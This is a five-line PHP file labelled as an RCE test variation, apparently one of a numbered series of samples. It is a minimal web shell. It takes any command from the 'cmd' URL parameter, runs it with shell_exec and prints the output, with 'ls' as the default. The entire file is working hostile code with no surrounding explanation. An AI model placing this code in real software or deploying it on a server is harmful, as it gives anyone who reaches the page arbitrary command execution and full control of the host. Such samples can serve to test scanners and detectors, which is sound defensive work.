<?php
// RCE test variation #829
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>